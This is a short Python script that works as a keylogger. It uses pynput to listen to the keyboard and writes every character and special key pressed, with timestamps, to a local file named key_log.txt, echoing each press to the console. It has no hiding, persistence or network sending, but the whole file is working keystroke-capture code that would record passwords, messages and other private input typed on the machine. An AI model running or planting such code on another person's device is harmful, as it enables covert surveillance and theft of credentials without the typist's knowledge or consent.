from pynput import keyboard
import logging

# Set up logging to a file
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error logging key press: {e}")
    print(f"Key pressed: {key}")  # Debug statement

def start_keylogger():
    print("Starting keylogger...")  # Debug statement
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
